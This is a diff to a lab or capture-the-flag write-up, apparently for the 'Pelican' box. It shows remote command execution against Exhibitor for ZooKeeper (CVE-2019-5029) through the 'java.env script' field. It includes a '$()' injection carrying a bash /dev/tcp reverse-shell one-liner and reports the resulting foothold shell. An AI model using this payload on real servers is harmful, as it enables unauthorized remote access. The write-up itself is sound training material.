@@ -77,10 +77,29 @@ I have only placed the current name as a place holder for the target IP.
 
 Luckily, now that we have added the IP address to the /etc/hosts file, we can access a web page on the target IP port 8080.
 
-On port 8080, we see an Exhibitor for Zookeeper and a version number, v1.0.
+On port 8080, we see an Exhibitor for Zookeeper web title and a version number, v1.0.
+
+![](Pasted%20image%2020261001155600.png)
+
 
 Using this title and version number we research for any known exploits for our service enumeration.
 # Service Enumeration
 
+After finding a known exploit of Exhibitor on Talos, we attempt the exploit on the web service. 
 
+Talos Exhibitor Exploit & Proof of Concept (CVE-2019-5029) -> https://talosintelligence.com/vulnerability_reports/TALOS-2019-0790 
+
+
+The exploit is performed by placing "$()" around the command of your choice which you want to run on the host server inside of the Exhibitor "java.env script" field
+
+Ex. 
+	$(/bin/bash -i >& /dev/tcp/192.168.XXX.XXX/80 0>&1)
+
+In the above example, I chose to create a reverse shell on the port 80 as my injected command.
+
+Successfully, we are able to get a foothold shell as the user, "Charles" when connected to our listener on port 80
+
+	charles@pelican:/opt/zookeeper$
+
+The local.txt file can be found in the /home directory for our first flag.
 # Privilege Escalation
